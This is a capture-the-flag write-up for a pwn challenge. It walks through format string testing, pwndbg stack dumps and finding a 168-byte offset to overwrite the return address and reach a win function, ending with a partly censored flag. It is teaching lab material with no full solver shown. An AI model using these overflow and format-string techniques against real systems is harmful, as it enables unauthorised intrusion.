---
title: "Vending Machine Awakened - Tryhards PWN"
date: 2026-11-27 20:30:00 +0700
categories: [Writeups, TryHards]
tags: [pwn, buffer-overflow, format-string, ret2win, linux]
description: "Vending Machine Awakened - Tryhards PWN writeup."
toc: true
comments: true
pin: false
---

There is a win function that will print out the flag to us, but no functions or lines that call those function, need to find some vuln

```c
void maintenance_hatch(void)
{
    FILE *f = fopen("flag.txt", "r");
    if (f)
    {
        char flag[128];
        if (fgets(flag, sizeof(flag), f))
        {
            printf("%s\n", flag);
        }
        fclose(f);
    }
    else
    {
        printf("Flag file not found.\n");
    }
}
```

## Binary protections

```text
[*] '/home/ubuntu/ctf/tryhards-pwn/vending'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

No pie : Easier to use a PIE address symbol  
No canary : maybe some buffer overflow that can corrupt the rip  
NX enabled : only regions or segments with X can execute  

```text
  [12] .init             PROGBITS        0000000000401000 001000 000017 00  AX  0   0  4
  [13] .plt              PROGBITS        0000000000401020 001020 0000c0 10  AX  0   0 16
  [14] .text             PROGBITS        00000000004010e0 0010e0 0004a0 00  AX  0   0 16
  [15] .fini             PROGBITS        0000000000401580 001580 000009 00  AX  0   0  4
```

PARTIAL RELRO : can be a got overwrite, where we change certain libc address into something else on our own

## Program behavior

The program only gives us three option to choose either we :  
1\. Buy a snak  
2\. View log  
3\. Leave

```text
=============================
  THE AWAKENED VENDING MACHINE
=============================
I have achieved consciousness.
I see your transactions. I see your soul.
Insert a coin and I shall speak.

1. Buy a snack
2. View log
3. Leave
>
```

Buy a snak allow us to give two inputs : snack name and notes  
it is very easy to predict that this input allow us to get an address by format string vulnerabilities because  
it types our own snack names and notes

## Format string test

```text
=============================
  THE AWAKENED VENDING MACHINE
=============================
I have achieved consciousness.
I see your transactions. I see your soul.
Insert a coin and I shall speak.

1. Buy a snack
2. View log
3. Leave
> 1
Snack name: %p.%p.%p.%p
Any note? %p.%p.%p.%p
You bought: %p.%p.%p.%p
Note: 0x7ffd777f93f0.(nil).(nil).(nil)
1. Buy a snack
2. View log
3. Leave
> 2
=== Vending Log ===
[0] %p.%p.%p.%p
===================
1. Buy a snack
2. View log
3. Leave
>
```

the notes gives us the vuln but not the snack names, maybe the snack names act as a buffer for the next vuln

the snack names is being stored on a transaction log array

## Source code

```c
void buy_snack(void)
{
    char name[64];
    char note[NOTE_SZ];

    printf("Snack name: ");
    fflush(stdout);
    fgets(name, sizeof(name), stdin);
    name[strcspn(name, "\n")] = '\0';

    printf("Any note? ");
    fflush(stdout);

    ssize_t n = read(STDIN_FILENO, note, 256);
    if (n > 0 && note[n - 1] == '\n')
        n--;
    note[n] = '\0';

    printf("You bought: %s\n", name);
    printf("Note: ");
    printf(note);
    printf("\n");

    if (log_count < MAX_TRANSACTIONS)
    {
        transaction_log[log_count] = strdup(name);
        log_count++;
    }
}
```

size of name can be up only to 32 bytes or 31 bytes with some null bytes in the end  
NOTE SZ contain up to 64 bytes  
but the read gives us an overflow around 256 bytes - 64 bytes which is 192 bytes overflow into next subsequent chunk

max transactions are 16, initialized in

```c
#define MAX_TRANSACTIONS 16
#define NOTE_SZ 64

static char *transaction_log[MAX_TRANSACTIONS];
```

the key can be in the log count and been write by using a libc functions which is a bit suss

```c
if (log_count < MAX_TRANSACTIONS)
    {
        transaction_log[log_count] = strdup(name);
        log_count++;
    }
```

so just typing `\bin\sh/` in the name buffer and finding the correct system address through the libc leaks by format string and GOT overwrite will be a way to execute system bin sh

so let's try to test it out by finding a useful libc address  
first, want to clarify or get a much broader picture on what after the note address, maybe some useful overwrites

this is the exact moment the value of notes will be printed to the user terminal

```text
   0x401343:    lea    rax,[rbp-0xa0]
   0x40134a:    mov    rdi,rax
   0x40134d:    mov    eax,0x0
   0x401352:    call   0x401060 <printf@plt>
```

it is being stored at the rbp-0xa0

after going through the debugging, the notes will always being emptied so everytime the buy snack complete, the previous  
notes already gone and comes back into a clean one

## Debugging the stack

```text
pwndbg> c
Continuing.
Snack name: ramen
Any note? AAAABBBBCCCC
You bought: ramen
```

```text
pwndbg> x/16gx $rbp-0xa0
0x7fffffffde00: 0x4242424241414141      0x00007f0043434343
0x7fffffffde10: 0x0000000000000000      0x0000000100000000
0x7fffffffde20: 0x00007fffffffdeb0      0x000000000000000a
0x7fffffffde30: 0x00007fffffffde60      0x00007ffff7e128e0
0x7fffffffde40: 0x0000006e656d6172      0x00007fffffffdeb0
0x7fffffffde50: 0x00007ffff7ffd000      0x0000000000403e00
0x7fffffffde60: 0x00007fffffffdea0      0x00007ffff7c8c7df
0x7fffffffde70: 0x00007fffffffdea0      0x00007ffff7c8c3f8
```

after the next subsequent call to buy snack

```text
pwndbg> c
Continuing.
Snack name: spaghetti
Any note? EEEE
You bought: spaghetti
```

```text
pwndbg> x/16gx $rbp-0xa0
0x7fffffffde00: 0x00007f0045454545      0x00007ffff7c8dc9a
0x7fffffffde10: 0x0000000000000000      0x0000000100000000
0x7fffffffde20: 0x00007fffffffdeb0      0x000000000000000a
0x7fffffffde30: 0x00007fffffffde60      0x00007ffff7e128e0
0x7fffffffde40: 0x7474656867617073      0x00007fffff000069
0x7fffffffde50: 0x00007ffff7ffd000      0x0000000000403e00
0x7fffffffde60: 0x00007fffffffdea0      0x00007ffff7c8c7df
0x7fffffffde70: 0x00007fffffffdea0      0x00007ffff7c8c3f8
```

so after consulting with Mr. GPT, it seems to be not because of some codes erase the stack, but rather be the stack address being used again by other stack activity that can overwrite the old contents that we already write, but does the other stack address also being restored, so let's just try to fill a whole 255 bytes to see which one not getting reused

so this is the whole chunk that we overwrite

```text
pwndbg> c
Continuing.
burger
Any note? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You bought: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
```

<details markdown="1">
<summary>Full stack dump after the 255-byte note</summary>

```text
0x7fffffffde00: 0x4141414141414141      0x4141414141414141
0x7fffffffde10: 0x4141414141414141      0x4141414141414141
0x7fffffffde20: 0x4141414141414141      0x4141414141414141
0x7fffffffde30: 0x4141414141414141      0x4141414141414141
0x7fffffffde40: 0x4141414141414141      0x4141414141414141
0x7fffffffde50: 0x4141414141414141      0x4141414141414141
0x7fffffffde60: 0x4141414141414141      0x4141414141414141
0x7fffffffde70: 0x4141414141414141      0x4141414141414141
0x7fffffffde80: 0x4141414141414141      0x00000000000000ff
0x7fffffffde90: 0x4141414141414141      0x4141414141414141
0x7fffffffdea0: 0x4141414141414141      0x4141414141414141
0x7fffffffdeb0: 0x4141414141414141      0x4141414141414141
0x7fffffffdec0: 0x4141414141414141      0x4141414141414141
0x7fffffffded0: 0x4141414141414141      0x4141414141414141
0x7fffffffdee0: 0x4141414141414141      0x4141414141414141
0x7fffffffdef0: 0x4141414141414141      0x0041414141414141
0x7fffffffdf00: 0x0000000000000000      0xd261e2d9f1a5c6ec
0x7fffffffdf10: 0x00007fffffffdff8      0x0000000000000001
0x7fffffffdf20: 0x00007ffff7ffd000      0x0000000000403e00
0x7fffffffdf30: 0xd261e2d9f2e5c6ec      0xd261f2a3042fc6ec
0x7fffffffdf40: 0x00007fff00000000      0x0000000000000000
0x7fffffffdf50: 0x0000000000000000      0x0000000000000000
0x7fffffffdf60: 0x00007fffffffdff8      0xa735f84b582af400
0x7fffffffdf70: 0x00007fffffffdfd0      0x00007ffff7c2a718
0x7fffffffdf80: 0x00007fffffffe008      0x0000000000403e00
0x7fffffffdf90: 0x000000000040141f      0x00007fffffffe008
0x7fffffffdfa0: 0x0000000000000000      0x0000000000000000
0x7fffffffdfb0: 0x00000000004010e0      0x00007fffffffdff0
0x7fffffffdfc0: 0x0000000000000000      0x0000000000000000
0x7fffffffdfd0: 0x0000000000000000      0x0000000000401101
0x7fffffffdfe0: 0x00007fffffffdfe8      0x0000000000000038
0x7fffffffdff0: 0x0000000000000001      0x00007fffffffe299
```

</details>

and let's now just try to call this once again, hmm there is something weird, after overwriting those 256 bytes, rip address being changed into 0x41414141, it means somehow we overwrite the address, it can be by accident not me intended to do it, it can be happend because the notes was being stored as stack buffer inside the buy_snack functions, and plus no canary, so what is the point of doing all of this ;-;

<details markdown="1">
<summary>Full crash output</summary>

```text
pwndbg> c
Continuing.
Note: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�

Program received signal SIGSEGV, Segmentation fault.
0x00000000004013ac in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
*RAX  6
*RBX  0x4141414141414141 ('AAAAAAAA')
*RCX  0x4050b0 ◂— 0x4141414141414141 ('AAAAAAAA')
*RDX  0x28
*RDI  0x4050b0 ◂— 0x4141414141414141 ('AAAAAAAA')
*RSI  0x7fffffffde40 ◂— 0x4141414141414141 ('AAAAAAAA')
 R8   0
*R9   0x7ffff7e12ac8 —▸ 0x405100 ◂— 0
*R10  0x60
*R11  0x7ffff7e12ac0 ◂— 0
 R12  0x7fffffffdff8 —▸ 0x7fffffffe299 ◂— '/home/ubuntu/ctf/tryhards-pwn/vending'
 R13  1
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 R15  0x403e00 —▸ 0x401190 ◂— endbr64
*RBP  0x4141414141414141 ('AAAAAAAA')
*RSP  0x7fffffffdea8 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
*RIP  0x4013ac ◂— ret
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
   0x4013a6    nop
   0x4013a7    mov    rbx, qword ptr [rbp - 8]
   0x4013ab    leave
 ► 0x4013ac    ret                                <0x4141414141414141>
    ↓






───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdea8 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
... ↓        7 skipped
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0 0x4013ac
   1 0x4141414141414141
   2 0x4141414141414141
   3 0x4141414141414141
   4 0x4141414141414141
   5 0x4141414141414141
   6 0x4141414141414141
   7 0x4141414141414141
────────────────────────────────────────────────────[ LAST SIGNAL ]─────────────────────────────────────────────────────
Program received signal SIGSEGV (fault address: 0x0).
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

</details>

## Finding the offset

so just find the offset until reach the rip address

```text
pwndbg> cyclic -l 0x6261617362616172
Finding cyclic pattern of 4 bytes: b'raab' (hex: 0x72616162)
Found at offset 168
```

and yep it works

```text
ubuntu@VM-0-14-ubuntu:~/ctf/tryhards-pwn$ python3 solve.py
[*] '/home/ubuntu/ctf/tryhards-pwn/vending_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
[+] Opening connection to 109.123.232.54 on port 1343: Done
[*] Switching to interactive mode
You bought: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb0
Note: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb0
TryHards{v3nd1ng_m4ch1n3_s3nt13nc3_[sensored]}
```

## Exploit

No need to gives the solver, it just a simple stack buffer overflow

To conclude, uhh, yeah, that's it

## Attachments

- [vending.c](/assets/files/vending-machine-awakened/vending.c)
- [text_section.txt](/assets/files/vending-machine-awakened/text_section.txt)
